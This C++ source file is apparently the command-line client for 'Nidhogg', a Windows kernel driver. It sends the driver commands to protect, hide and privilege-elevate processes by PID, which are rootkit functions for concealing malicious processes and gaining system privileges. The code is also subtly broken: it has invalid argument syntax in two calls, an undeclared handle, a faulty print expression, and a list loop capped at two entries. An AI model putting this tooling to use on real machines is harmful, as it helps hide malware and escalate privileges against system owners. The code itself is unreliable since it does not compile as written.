#include <Windows.h>
#include <iostream>
#include <vector>
#include "../NidhoggClient/Nidhogg.hpp"

enum class Options {
		Unknown,
		Add, Remove, List, Clear, Hide, Elevate
};

int Error(int errorCode) {
    switch (errorCode) {
        case NIDHOGG_ERROR_CONNECT_DRIVER:
            std::cout << "Error: Could not connect to driver." << std::endl;
            break;
        case NIDHOGG_ERROR_DEVICECONTROL_DRIVER:
            std::cout << "Error: failed to do operation." << std::endl;
            break;
        default:
            std::cout << "Error: Unknown error." << std::endl;
            break;
    }
	
	return 1;
}

int PrintUsage() {
	std::cout << "NidhoggClient [add | remove | clear | list | hide | elevate] [pid] ...\n" << std::endl;
	return 0;
}

std::vector<DWORD> ParsePids(const wchar_t* buffer[], int count) {
	std::vector<DWORD> pids;
	for (int i = 0; i < count; i++)
		pids.push_back(_wtoi(buffer[i]));
	return pids;
}

int wmain(int argc, const wchar_t* argv[]) {
    DWORD bytes;
    std::vector<DWORD> pids;
    Options option;
	int success = NIDHOGG_SUCCESS;

	if (argc < 2)
		return PrintUsage();

	if (_wcsicmp(argv[1], L"add") == 0)
		option = Options::Add;
	else if (_wcsicmp(argv[1], L"remove") == 0)
		option = Options::Remove;
	else if (_wcsicmp(argv[1], L"clear") == 0)
		option = Options::Clear;
	else if (_wcsicmp(argv[1], L"list") == 0)
		option = Options::List;
	else if (_wcsicmp(argv[1], L"hide") == 0)
		option = Options::Hide;
	else if (_wcsicmp(argv[1], L"elevate") == 0)
		option = Options::Elevate;
	else {
		std::cout << "Unknown option.\n" << std::endl;
		return PrintUsage();
	}

	switch (option) {
	case Options::Add:
		pids = ParsePids(argv + 2, argc - 2);
        success = NidhoggProcessProtect(pids);
		break;

	case Options::Remove:
		pids = ParsePids(argv + 2, argc - 2);
		success = NidhoggProcessUnprotect(pids);
		break;

	case Options::List:
		DWORD pidsList[MAX_PIDS];
        success = NidhoggListProtectedProcesses(pidsList);

        if (success == NIDHOGG_SUCCESS) {
            for (int i = 0; i < 2; i++) {
                std::cout << "pid: " + pidsList[i] << std::endl;
            }
        }
		break;

	case Options::Clear:
		success = NidhoggProcessClearAllProtection();
		break;

	case Options::Hide:
		pids = ParsePids(argv + 2, argc - 2);
		success = NidhoggProcessHide(std::vector<DWORD> pids);
		break;
	case Options::Elevate:
		pids = ParsePids(argv + 2, argc - 2);
		success = NidhoggProcessElevate(std::vector<DWORD> pids);
		break;

	}

	if (success != NIDHOGG_SUCCESS)
        return Error(success);

	std::cout << "Operation succeeded.\n" << std::endl;

	CloseHandle(hFile);

	return 0;
}
